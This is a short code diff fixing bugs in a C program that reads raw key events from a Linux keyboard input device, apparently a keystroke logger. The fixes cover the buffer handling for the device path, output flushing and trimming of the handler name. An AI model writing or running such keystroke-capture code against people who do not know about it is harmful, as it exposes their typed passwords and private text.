@@ -14,14 +14,16 @@
 void capture_keys(FILE *file, char *event)
 {
 	printf("a\n");
+	fflush(stdout);
 
 	struct input_event ev;
 
-	char *path = "/dev/input/";
+	char path[255] = "/dev/input/";
 
 	strcat(path, event);
 
 	printf("%s", path);
+	fflush(stdout);
 
 	int fd = open(path, O_RDONLY);
 
@@ -29,6 +31,7 @@ void capture_keys(FILE *file, char *event)
 
 	while (1)
 	{
+
 		int r = read(fd, &ev, sizeof(ev));
 		if ((ev.type == EV_KEY) && (ev.value == 0))
 		{
@@ -87,7 +90,6 @@ char *find_keyboard()
 	fclose(ptr);
 
 	event = strstr(handlers_line, "event");
-	char *ans = strndup(event, 7);
-	ans[6] = '\n';
+	char *ans = strndup(event, 6);
 	return ans;
 }
